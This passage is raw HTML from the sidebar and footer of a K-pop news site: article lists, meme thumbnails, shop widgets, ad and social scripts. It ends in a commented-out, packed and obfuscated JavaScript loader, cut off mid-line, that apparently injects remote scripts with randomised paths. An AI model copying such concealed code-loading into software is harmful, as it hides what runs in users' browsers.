<i class="fa fa-eye"></i> 156,480&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 30,288&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 1,901 </div>
</div>
</article>
<article class="list" style="padding: 10px 0 5px 0;">
<div class="image" style="min-height: 60px;">
<a href='/article/2018/02/japanese-porn-actress-yua-mikami-to-make-her-idol-group-debut-in-korea' target='_self' class='' style=''><img id='mdw' src='https://www.allkpop.com/upload/2018/02/af/23115523/misc.jpg' style="max-width:1000px;width:90px;height:60px;min-height:60px" alt='misc' title='misc'></a> </div>
<div class="text">
<h1 style="font-size: 1.1em;line-height:1.2em"><a href='/article/2018/02/japanese-porn-actress-yua-mikami-to-make-her-idol-group-debut-in-korea' target='_self' class='' style=''>Japanese porn actress Yua Mikami to make her idol group debut in Korea</a></h1>
<div class="info" style="font-size: 10px;">
<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="1519404900">22 days ago</span>&nbsp;&nbsp;
<i class="fa fa-eye"></i> 219,307&nbsp;&nbsp;
<i class="fa fa-share-square-o"></i> 5,915&nbsp;&nbsp;
<i class="fa fa-comment-o"></i> 1,155 </div>
</div>
</article>
</article>
</div>
<script data-cfasync="false">
function get_most_discussed(mode,ismobile){
    /*var md_list='';
    $.post("/plugin/view/view_ok.php",{mode:mode,ad_flag:"home",user_country:"US",img_switch:"1"},function(data){
        for(var i=0;i<data.length;i++){
            md_list+='<article class="list" style="padding: 10px 0 5px 0;">';
                md_list+='<div class="image" style="min-height: 60px;">';
                md_list+=data[i]['img'];
                md_list+='</div>';
                md_list+='<div class="text">';
                if(ismobile=="0"){
                    md_list+='<h1 style="font-size: 1.1em;line-height:1.2em">'+data[i]['title']+'</h1>';
                }else{
                    md_list+='<h1 style="font-size: 16px;line-height:19px">'+data[i]['title']+'</h1>';
                }
                    md_list+='<div class="info" style="font-size: 10px;">';
                        md_list+='<i class="fa fa-clock-o"></i> <span class="realtime" data-ts="'+data[i]['search_ts']+'">'+data[i]['human_time']+'</span>&nbsp;&nbsp;';
                        md_list+='<i class="fa fa-eye"></i> '+data[i]['hit']+'&nbsp;&nbsp;';
                        md_list+='<i class="fa fa-share-square-o"></i> '+data[i]['social_share']+'&nbsp;&nbsp;';
                        md_list+='<i class="fa fa-comment-o"></i> '+data[i]['comment_count'];
                    md_list+='</div>';
                md_list+='</div>';
            md_list+='</article>';
        }
        $('.'+mode).html(md_list);
        md_list='';
    },"json");*/
}
$(document).ready(function(){var ismobile='0',md_flag='';if(md_flag=="today"||md_flag==""){$('.md_today').addClass("focus");get_most_discussed('md_today_container',ismobile);$('.md_today_container').show();}$('.md_today').on('click',function(){$('.md_container').hide();$('.md_week').removeClass("focus");$('.md_month').removeClass("focus");$('.md_today').addClass("focus");if(!$.trim($('.md_today_container').html())){get_most_discussed('md_today_container',ismobile);}$('.md_today_container').show();});$('.md_week').on('click',function(){$('.md_container').hide();$('.md_today').removeClass("focus");$('.md_month').removeClass("focus");$('.md_week').addClass("focus");if(!$.trim($('.md_week_container').html())){get_most_discussed('md_week_container',ismobile);}$('.md_week_container').show();});$('.md_month').on('click',function(){$('.md_container').hide();$('.md_today').removeClass("focus");$('.md_week').removeClass("focus");$('.md_month').addClass("focus");if(!$.trim($('.md_month_container').html())){get_most_discussed('md_month_container',ismobile);}$('.md_month_container').show();});});
</script><div style="float: left;width: 100%;text-align: center;border-bottom: 1px solid #ccc;padding:25px 0;">

<div id="insticator-container"><div id="div-insticator-ad-1"></div><div id="insticator-embed"></div><div id="div-insticator-ad-2"></div><script data-cfasync='false' type="text/javascript">/*<![CDATA[*/Insticator.ad.loadAd("div-insticator-ad-1");Insticator.ad.loadAd("div-insticator-ad-2");Insticator.load("em",{id : "62ceb535-0cf5-4e88-a850-8a3b684eadc1"})/*]]>*/</script></div>

</div>
<div style="float: left;width: 100%;text-align: center;">
<h2 style="margin-bottom:0;">CONNECT WITH ALLKPOP</h2><ol id="article-headline-social-list" style="width: 100%;margin-top: 0px;border-bottom: 1px solid #ccc;padding:25px 0;"><li class="facebook" style="width: 100%;padding:0px;"><a href="https://www.facebook.com/allkpop" target="_blank">Like us on Facebook</a></li><li class="twitter" style="width: 100%;padding:0px;"><a href="https://twitter.com/allkpop" target="_blank">Follow us on Twitter</a></li><li class="instagram" style="width: 100%;padding:0px;"><a href="https://www.instagram.com/allkpop/" target="_blank">Follow us on Instagram</a></li><li class="youtube" style="width: 100%;padding:0px;"><a href="https://www.youtube.com/user/allkpop" target="_blank">Subscribe on Youtube</a></li><li class="googleplus" style="width: 100%;padding:0px;"><a href="https://plus.google.com/+allkpop/posts" target="_blank">Follow us on Google+</a></li></ol>
</div>
<style>.rgrid-6{display: inline-block;vertical-align: top;}#article-category-spotlight{text-align: center;}#article-category-spotlight .rgrid-6.spaced{width: 47.7% !important;}#article-category-spotlight .rgrid-6.spaced img{display: block;width: 100%;height: auto;}@media (max-width: 460px) {#article-category-spotlight .rgrid-6.spaced{width: 47% !important;}}</style>
<div style="float: left;margin-top:1px;">
<article class="list" style="border: none;padding-top: 0.83em;margin-bottom: -35px;">
<nav class="dual-spacing" style="margin-top: 0;">
<ol class="options">
<li class="identifier" style="font-size: 20px;width:96%;color:#7c7c7c!important;text-align: left;">Popular Memes <a href="/meme" class="shop_identifier float-right" style="margin-top: 3px;">View More</a></li>
<li class="today" style="font-size: 14px;margin-right: 5px;">Today<span></span></li>
<li class="week" style="font-size: 14px;margin-right: 5px;">This Week<span></span></li>
<li class="month" style="font-size: 14px;">This Month<span></span></li>
</ol>
</nav>
</article>
<article id="article-category-spotlight" class="container today_container meme_containers" style="padding-top: 0px;">
<ul class="today_meme_scr" style="list-style: none;margin:0;padding:0;">
<div class="rgrid-6 spaced">
<a href="/meme_view/p5i0ka" style="display:inline-block;" data-width="640" data-height="620" data-max-width="140" data-ratio="144">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p5i0ka.jpg') no-repeat center center;background-size:144px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p5fxvh" style="display:inline-block;" data-width="320" data-height="279" data-max-width="140" data-ratio="160">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p5fxvh.jpg') no-repeat center center;background-size:160px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p5hxi2" style="display:inline-block;" data-width="183" data-height="275" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p5hxi2.png') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p5i0fu" style="display:inline-block;" data-width="540" data-height="497" data-max-width="140" data-ratio="152">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p5i0fu.jpg') no-repeat center center;background-size:152px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p5fvyc" style="display:inline-block;" data-width="600" data-height="600" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p5fvyc.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p5hxun" style="display:inline-block;" data-width="452" data-height="474" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p5hxun.png') no-repeat center center;background-size:140px"></li>
</a>
</div>
</ul>
</article>
<article id="article-category-spotlight" class="container week_container meme_containers" style="padding-top: 0px;">
<ul class="week_meme_scr" style="list-style: none;margin:0;padding:0;">
<div class="rgrid-6 spaced">
<a href="/meme_view/p55q7d" style="display:inline-block;" data-width="320" data-height="319" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p55q7d.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p513t2" style="display:inline-block;" data-width="554" data-height="428" data-max-width="140" data-ratio="181">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p513t2.jpg') no-repeat center center;background-size:181px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p55tcl" style="display:inline-block;" data-width="480" data-height="480" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p55tcl.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p54unr" style="display:inline-block;" data-width="394" data-height="400" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p54unr.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p5i0ka" style="display:inline-block;" data-width="640" data-height="620" data-max-width="140" data-ratio="144">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p5i0ka.jpg') no-repeat center center;background-size:144px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p5727p" style="display:inline-block;" data-width="320" data-height="319" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p5727p.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
</ul>
</article>
<article id="article-category-spotlight" class="container month_container meme_containers" style="padding-top: 0px;">
<ul class="month_meme_scr" style="list-style: none;margin:0;padding:0;">
<div class="rgrid-6 spaced">
<a href="/meme_view/p4xyb3" style="display:inline-block;" data-width="416" data-height="400" data-max-width="140" data-ratio="145">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/03/p4xyb3.jpg') no-repeat center center;background-size:145px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p4sfu4" style="display:inline-block;" data-width="480" data-height="480" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/02/p4sfu4.png') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p4sfwb" style="display:inline-block;" data-width="225" data-height="224" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/02/p4sfwb.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p4t0sd" style="display:inline-block;" data-width="640" data-height="1138" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/02/p4t0sd.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p4gj7a" style="display:inline-block;" data-width="280" data-height="280" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/02/p4gj7a.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
<div class="rgrid-6 spaced">
<a href="/meme_view/p4w2e4" style="display:inline-block;" data-width="225" data-height="225" data-max-width="140" data-ratio="140">
<li class="meme_li" style="margin:0;width:140px;height:140px;padding:0px;border:solid 1px #b0b9ba;background:url('//www.allkpop.com/meme/generate/2018/02/p4w2e4.jpg') no-repeat center center;background-size:140px"></li>
</a>
</div>
</ul>
</article>
</div>

<script>
function get_popular_meme(mode){
    /*var rpm_list='';
    $.post("/meme/response.php",{mode:mode},function(data){
        for(var i=0;i<data['meme_permalink'].length;i++){
            rpm_list+='<div class="rgrid-6 spaced">';
    			rpm_list+='<a href="'+data['meme_permalink'][i]+'" style="display:inline-block;" data-width="'+data['meme_w'][i]+'" data-height="'+data['meme_h'][i]+'" data-max-width="'+data['meme_max_width'][i]+'" data-ratio="'+data['meme_ratio'][i]+'">';
    				rpm_list+='<li class="meme_li" style="margin:0;width:'+data['meme_max_width'][i]+'px;height:'+data['meme_max_width'][i]+'px;padding:0px;border:solid 1px #b0b9ba;background:url(\'//www.allkpop.com/'+data['meme_img'][i]+'\') no-repeat center center;background-size:'+data['meme_ratio'][i]+'px"></li>';
                rpm_list+='</a>';
    		rpm_list+='</div>';
        }
        $('.'+mode).html(rpm_list);
        rpm_list='';
    },"json");*/
}
$(document).ready(function(){var popular_meme_flag='';if(popular_meme_flag=="today"||popular_meme_flag==""){$('.today').addClass("focus");get_popular_meme('today_meme_scr');$('.today_container').show();}$('.today').on('click',function(){$('.meme_containers').hide();$('.week').removeClass("focus");$('.month').removeClass("focus");$('.today').addClass("focus");if(!$.trim($('.today_meme_scr').html())){get_popular_meme('today_meme_scr');}$('.today_container').show();});$('.week').on('click',function(){$('.meme_containers').hide();$('.today').removeClass("focus");$('.month').removeClass("focus");$('.week').addClass("focus");if(!$.trim($('.week_meme_scr').html())){get_popular_meme('week_meme_scr');}$('.week_container').show();});$('.month').on('click',function(){$('.meme_containers').hide();$('.today').removeClass("focus");$('.week').removeClass("focus");$('.month').addClass("focus");if(!$.trim($('.month_meme_scr').html())){get_popular_meme('month_meme_scr');}$('.month_container').show();});});
</script>
<style>.forum_widget_src{float: left;width: 100%;text-align: center;padding: 25px 0;border-bottom:1px solid #ccc;}.forum_widget_src h2{margin:0px;padding:10px 0 8px 5px;border-bottom: 1px solid #fff;text-align: left;background-color: #000;}.forum_widget_src h2 a{color:#fff;font-size:15px;text-decoration: none;}.forum_widget_src h2 a:hover{color:#ccc;}.forum_widget{width: 100%;margin: 0 0 9px 0!important;padding-top:3px!important;border-bottom: 1px solid #fff;background-color: #000;}.forum_widget li{width: 90%;text-align:left!important;line-height:40px!important;margin: 0!important;border-bottom: 1px dotted #e6413f;}.forum_widget li:last-child{border-bottom: none;}.forum_widget li a{font-family:Montserrat,sans-serif;font-size:1em;}.forum_widget li a:hover{color:#ccc!important;}#article-headline-social-list li a {text-decoration: none;color: #FFF;cursor: pointer;}#article-headline-social-list li {display: block;float: left;margin: 0 5px 5px 0;text-align: center;line-height: 30px;color: #FFF;padding: 0 15px;}#article-headline-social-list {margin: 30px 0 0 0;padding: 0;float: right;}</style>
<div class="forum_widget_src">
<h2><a href="https://www.allkpop.com/forum" target="_blank">Discussions from allkpop Forums...</a></h2>
<ol id="article-headline-social-list" class="forum_widget" style="">
<li style="padding:0 15px!important;width:90%!important;"><a href="https://www.allkpop.com/forum/threads/nct-2018-project-thread-nct-2018-empathy-released.135546/" title="▀▄▀▄ NCT 2018 ➤ Project Thread  ▀▄▀▄ | NCT 2018 EMPATHY Released •" target="_blank" style="font-size:12px">▀▄▀▄ NCT 2018 ➤ Project Thread…</a></li>
<li style="padding:0 15px!important;width:90%!important;"><a href="https://www.allkpop.com/forum/threads/at-this-point-bigbangs-flower-road-wont-get-a-pak.155317/" title="At this point, Bigbang's ''Flower Road'' won't get a PAK" target="_blank" style="font-size:12px">At this point, Bigbang's ''Flo…</a></li>
<li style="padding:0 15px!important;width:90%!important;"><a href="https://www.allkpop.com/forum/threads/when-twice-saying-i-dont-give-a-fuck.155316/" title="When Twice saying " I don't give a fuck...."" target="_blank" style="font-size:12px">When Twice saying "I don't giv…</a></li>
<li style="padding:0 15px!important;width:90%!important;"><a href="https://www.allkpop.com/forum/threads/girl-groups-are-better-than-boy-groups-in-every-way-shape-and-form.154720/" title="Girl groups are better than boy groups in every way, shape, and form" target="_blank" style="font-size:12px">Girl groups are better than bo…</a></li>
</ol>
<div style="padding:5px 0;background-color: #000;"><a href="https://www.allkpop.com/forum" target="_blank"><img src="https://www.allkpop.com/plugin/forum_widget/img/logo_w_f.png" style="width: 150px;"></a></div>
</div>

<div style="float: left;width: 100%;text-align: center;">
<h2 style="margin-bottom:0;">BRAND PARTNERS</h2>
<ol id="article-headline-social-list" style="width: 100%;margin-top: 0px;border-bottom: 1px solid #ccc;padding:25px 0;">
<li style="width: 100%;padding:0;line-height:10px;"><a href="https://www.allkpop.com/officialpage/vlive"><img src="https://www.allkpop.com/imgs/external/brand_partners/vfriends2.png"></a></li>
<li style="width: 100%;padding:0;line-height:10px;"><a href="https://www.allkpop.com/officialpage/imlive" target="_blank"><img src="https://www.allkpop.com/imgs/external/brand_partners/im_live.jpg"></a></li>
</ol>
</div><div style='float: left;width: 100%;text-align: center;border-bottom: 1px solid #ccc;padding:25px 0;'>
<div id='div-gpt-ad-1456256348948-0' style='width:300px;text-align: center;' adonis-marker>
<script type='text/javascript'>
            googletag.cmd.push(function() { googletag.display('div-gpt-ad-1456256348948-0'); });
            </script>
</div></div><div id="shop_widget_right" class="shop_widget_right" style="float:left;text-align:center;">
<article class="list" style="border: none;padding-bottom:0px;">
<nav class="" style="margin-bottom: 0;">
<ol class="options" style="width: 100%;">
<li class="identifier" style="width:60%;float:left;text-align: left;margin-right:0px;color:#7c7c7c!important;font-size:20px">From the Shop</li>
<li class="shop_identifier" style=""><a href="https://shop.allkpop.com" target="_blank" class="float-right">Shop More</a></li>
</ol>
</nav>
</article>
<article class="container" style="border:none;display:table;border-collapse: separate;border-spacing: 10px;padding-top:0;padding-bottom:0;">
<div id="home-shopnow-spotlight" class="grid-4 shop_widget1" style="width: 48%;display:table-cell">
<div class="shop-img">
<a href='https://shop.allkpop.com/products/bangtan-style-tee' target='_blank' class='' style=''><img id='shop_widget_org' src='https://www.allkpop.com/plugin/shop_widget/upload/theshop_widget_1521038012_bangtan_boys_navy_Mtee.jpg' style="max-width:1000px;width:100%;" alt='14' title='14'></a> <a href='https://shop.allkpop.com/products/bangtan-style-tee' target='_blank' class='' style=''><img id='shop_widget_overlay' src='https://www.allkpop.com/plugin/shop_widget/upload/theshop_widget_1521038016_bangtan_boys_black_Mtee.jpg' style="display:none;" alt='14' title='14'></a> </div>
<div class="shop-top-banner">14</div>
<div class="shop-bottom-banner">$18</div>
</div>
<div id="home-shopnow-spotlight" class="grid-4 shop_widget2" style="width: 48%;display:table-cell">
<div class="shop-img">
<a href='https://shop.allkpop.com/products/your-hope-tee' target='_blank' class='' style=''><img id='shop_widget_org' src='https://www.allkpop.com/plugin/shop_widget/upload/theshop_widget_1521038035_I_am_your_hope_white_Mtee.jpg' style="max-width:1000px;width:100%;" alt='hope' title='hope'></a> <a href='https://shop.allkpop.com/products/your-hope-tee' target='_blank' class='' style=''><img id='shop_widget_overlay' src='https://www.allkpop.com/plugin/shop_widget/upload/theshop_widget_1521038038_I_am_your_hope_black_Mtee.jpg' style="display:none;" alt='hope' title='hope'></a> </div>
<div class="shop-top-banner">hope</div>
<div class="shop-bottom-banner">$18</div>
</div>
</article>
<article class="container" style="display:table;border-collapse: separate;border-spacing: 10px;padding-top:0;">
<div id="home-shopnow-spotlight" class="grid-4 shop_widget3" style="width: 48%;display:table-cell">
<div class="shop-img">
<a href='https://shop.allkpop.com/products/hope-world-tee' target='_blank' class='' style=''><img id='shop_widget_org' src='https://www.allkpop.com/plugin/shop_widget/upload/theshop_widget_1521038060_hope_world_black_Mtee.jpg' style="max-width:1000px;width:100%;" alt='hope' title='hope'></a> <a href='https://shop.allkpop.com/products/hope-world-tee' target='_blank' class='' style=''><img id='shop_widget_overlay' src='https://www.allkpop.com/plugin/shop_widget/upload/theshop_widget_1521038063_hope_world_grey_Mtee.jpg' style="display:none;" alt='hope' title='hope'></a> </div>
<div class="shop-top-banner">hope</div>
<div class="shop-bottom-banner">$18</div>
</div>
<div id="home-shopnow-spotlight" class="grid-4 shop_widget4" style="width: 48%;display:table-cell">
<div class="shop-img">
<a href='https://shop.allkpop.com/products/dna-lyrics-tee' target='_blank' class='' style=''><img id='shop_widget_org' src='https://www.allkpop.com/plugin/shop_widget/upload/theshop_widget_1521038080_dna_lyrics_red_MTee.jpg' style="max-width:1000px;width:100%;" alt='dna' title='dna'></a> <a href='https://shop.allkpop.com/products/dna-lyrics-tee' target='_blank' class='' style=''><img id='shop_widget_overlay' src='https://www.allkpop.com/plugin/shop_widget/upload/theshop_widget_1521038083_dna_lyrics_grey_MTee.jpg' style="display:none;" alt='dna' title='dna'></a> </div>
<div class="shop-top-banner">dna</div>
<div class="shop-bottom-banner">$18</div>
</div>
</article>
</div>
<script>
    $(document).ready(function(){
        /*$.post("/plugin/shop_widget/shop_widget_ok.php",{mode:"shop_widget_right"},function(data){
            var cnt=1;
            for(var i=0;i<data.length;i++){
                $('.shop_widget'+cnt+' .shop-img').html(data[i]['img'+cnt]+data[i]['img'+cnt+'_overlay']);
                $('.shop_widget'+cnt+' .shop-top-banner').html(data[i]['title'+cnt]);
                $('.shop_widget'+cnt+' .shop-bottom-banner').html('$'+data[i]['price'+cnt]);cnt++;
            }
        },"json");*/
        $('.container').on('mouseover','#shop_widget_org',function(){$(this).css({'display':'none'});$(this).parent().parent().find('#shop_widget_overlay').css({'display':'block'});});$('.container').on('mouseleave','#shop_widget_overlay',function(){$(this).css({'display':'none'});$(this).parent().parent().find('#shop_widget_org').css({'display':'block'});});});</script>
<style>.sticky-wrapper{float:left;width:100%;}</style>
<script type="text/javascript" src="https://www.allkpop.com/js/external/jquery.sticky.js"></script>
<script>$(document).ready(function(){$("#shop_widget_right").sticky({ topSpacing: 50 });});</script>
</div>
</section>
<section id="additional-content" class="" style="padding-top: 1px;">
<div class="clear"></div><section id="mailing-list" class="full-width" style="margin-top:25px;"><article><h2>GET AKP IN YOUR INBOX!</h2><div class="alert subscribe_error_alert alert-error" style="width:50%;padding:5px;display: none; font-size:10px;margin-left:25%;margin-bottom:15px;color:#e6413f"></div><div class="alert subscribe_success_alert alert-success" style="width:50%;padding:5px;display: none; font-size:10px;margin-left:25%;margin-bottom:15px;color:green"></div><input id="subscribe_email" type="email" placeholder="YOUR EMAIL ADDRESS"><input id="mailing-list-btn" id="subscribe_btn" type="button" value="SUBSCRIBE"></article><article class="padding-bottom"><nav><ol class="social center text-center"><span class="uppercase">..or follow allkpop to stay updated:</span><li class="facebook"><a href="https://www.facebook.com/allkpop" target="_blank"></a></li><li class="twitter"><a href="https://twitter.com/allkpop" target="_blank"></a></li><li class="instagram"><a href="https://instagram.com/allkpop" target="_blank"></a></li><li class="youtube"><a href="https://www.youtube.com/user/allkpop" target="_blank"></a></li><li class="googleplus"><a href="https://plus.google.com/+allkpop/posts" target="_blank"></a></li></ol></nav></article></section>
<script>var ad_flag='home';</script>
<script async src="https://www.allkpop.com/plugin/mailing/src/mailing.js?v=6"></script>
</section>
<script data-cfasync='false'>
$(document).ready(function(){
    var current_flag='latest';
    var ad_flag='home';
    if(current_flag=="latest"){$('.latest').addClass("focus");}
    else if(current_flag=="most_discussed"){$('.most_discussed').addClass("focus");for(i=0;i<3;i++) {$('.fa-fire').toggle('slow');}}
    else if(current_flag=="trending"){$('.trending').addClass("focus");$('.fa-fire').hide();}
    else if(current_flag=="myfeed"){$('.myfeed').addClass("focus");}
    //else if(current_flag=="trending"){$('.trending').addClass("focus");for(i=0;i<3;i++) {$('.fa-fire').toggle('slow');}}
            $('.latest').on('click',function(){location.href="/latest";return;});$('.most_discussed').on('click',function(){location.href="/most_discussed";return;});$('.trending').on('click',function(){location.href="/trending";return;});$('.myfeed').on('click',function(){location.href="/myfeed";return;});
        $('.cookie_tab').on('click',function(e){
        e.preventDefault();
        if($(this).attr('data-value')!=""){
            $.post("/article/response.php",{mode:'lpt',flag:$(this).attr('data-value')},function(data){
                if(data=="1"){
                    $('.cookie_tab_src').fadeOut(400);
                }else{}
            });
        }
    });
});
</script>
<div class="copyright">
© 2007 - 2018 6Theory Media, LLC. allkpop® is a registered trademark of 6Theory Media, LLC.<br /><br />
<a href="/about">ABOUT</a> | <a href="/advertise">ADVERTISE</a> | <a href="/privacy">PRIVACY</a> | <a href="/tos">TERMS</a>
</div> </div>
<script>var user_id='',ismobile='0',part1='',iacp='';var date = new Date();date.setTime(date.getTime()-(10*1000));var expires = "; expires="+date.toGMTString();document.cookie = "iacp="+expires+";domain=.allkpop.com;path=/";</script>
<script async type="text/javascript" src="https://www.allkpop.com/js/scripts.min.js"></script>
<script async src="https://www.allkpop.com/js/fluidvids.min.js"></script>
<script async type="text/javascript" src="https://www.allkpop.com/plugin/social_login/src/social_login.js?v=1"></script>
<script async type="text/javascript" src="https://www.allkpop.com/plugin/menu/desktop/src/menu_desktop.min.js"></script>
<script>setTimeout(function(){$("span[id*='GGADad_ii_']").css({'z-index':'0'});$("span[id*='ad_ii_']").css({'z-index':'0'});},'3000');</script>
<script async type="text/javascript" src="https://www.allkpop.com/plugin/slider/js/jssor.slider.min.js"></script>
<script async type="text/javascript" src="https://www.allkpop.com/plugin/slider/js/jssor.min.js"></script>
<script type="text/javascript">ggv2id='3b084c4e';</script>
<script type="text/javascript" src="https://js.gumgum.com/services.js"></script>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
<script async defer src="//platform.instagram.com/en_US/embeds.js"></script>

<script>
/*** modal ***/
var modal = (function(){
	var method = {},$overlay,$modal,$content,$close;
	// Center the modal in the viewport
	method.center = function () {
		var top, left;
		top = Math.max($(window).height() - $modal.outerHeight(), 0) / 2;
		left = Math.max($(window).width() - $modal.outerWidth(), 0) / 2;
		$modal.css({top:top + $(window).scrollTop(),left:left + $(window).scrollLeft()});
	};

	// Open the modal
	method.open = function (settings) {
		$content.empty().append(settings.content);
		$modal.css({width: settings.width || 'auto',height: settings.height || 'auto'});
		method.center();
		$(window).bind('resize.modal', method.center);
		$modal.show();
		$overlay.show();
	};

	// Close the modal
	method.close = function () {
		$modal.hide();
		$overlay.hide();
		$content.empty();
		$close.removeClass('theshop_close');
        $(window).unbind('resize.modal');
	};

	// Generate the HTML and add it to the document
	$overlay = $('<div id="overlay"></div>');
	$modal = $('<div id="modal"></div>');
	$content = $('<div id="content"></div>');
	$close = $('<a id="close" href="#">close</a>');

	$modal.hide();
	$overlay.hide();
	$modal.append($content, $close);

	$(document).ready(function(){
		$('body').append($overlay, $modal);
        $('#overlay').on('click',function(){method.close();});
	});

	$close.click(function(e){
		e.preventDefault();
		method.close();
	});
    
	return method;
}());
/*$(document).ready(function(){
    setTimeout(function(){$('iframe').attr('sandbox','');},1000)
})*/
</script>
<script type="text/javascript">
//eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(6(){3 a=\'//1k.15/1j/Q/Q.1i\';3 b=\'1g.1h.15\';3 c=0;3 d=6(a,b){3 c,d,e;d=p;c=m.t(\'Y\');c.14=\'17/16\';c.u=a;c.19=c.1l=6(){7(!d&&(!q.F||q.F==\'1m\'||q.F==\'1r\')){d=H;7(b){m.s.B(c);b()}}};c.Z=6(){m.s.B(c);b()};m.s.I(c)};3 e=6(a,b){3 c=6(a){7(a===1q||a=="")a=1p.C;3 b=m.1n("1f");3 c=[];r(3 d=0;d<b.8;d++){3 e=m.t(\'a\');e.G(\'W\',b[d].u);3 f=e.P;f=f.o(\'/\');3 g=f.N();7(e.C==a&&g.8>5&&g.8<y)c.E(b[d].u);e=T}9 c};3 d=6(a,b){3 c=b.o(\'.\')[0];7(c.8<5)9 p;3 d=1o((c.8+1)/2)-1;3 e=h(0,c.8-2);7(e>=d)e+=1;3 c=c.x(0,e)+f.w(a)+c.x(e+1,c.8);c=c.x(0,d)+f.w(e)+c.x(d+1,c.8);7(b.o(\'.\').8>1)c=c+"."+b.o(\'.\')[1];A c=c+".M";9 c};3 e=6(a,b){3 c=[];r(3 e=0;e<b.8;e++){3 f=m.t(\'a\');f.G(\'W\',b[e]);3 g=f.P;g=g.o(\'/\');3 h=g.N();3 i=d(a,h);7(i!=p){g.E(i);g=g.13(\'/\');c.E(f.C+g)}f=T}9 c};3 i=e(a,c(b));7(i.8==0)9 b+"/"+g(1)+f.w(2)+f.w(a)+".M";3 j=h(0,i.8-1);9 i[j]};3 f={v:"18".o(""),K:6(a,b){3 c=a;r(3 d=0;d<b-a.8;d++)c=f.v[0]+c;9 c},w:6(a,b){7(a===0)9 f.K(f.v[0],b);3 c=\'\';1s(a>0){c=f.v[a%y]+c;a=n.z(a/y)}9 f.K(c,b)},1c:6(a){3 b=0,c=a.o("").1e();c.1d(6(a,c){b+=f.v.1a(a)*n.1b(y,c)});9 b}};3 g=6(a){3 b=\'\';3 c=\'18\';r(3 d=0;d<a;d++)b+=c.S(n.z(n.J()*c.8));9 b};3 h=6(a,b){9 n.z(n.J()*(b-a+1))+a};3 i=6(a){3 b=\'\';3 c=\'1v\';r(3 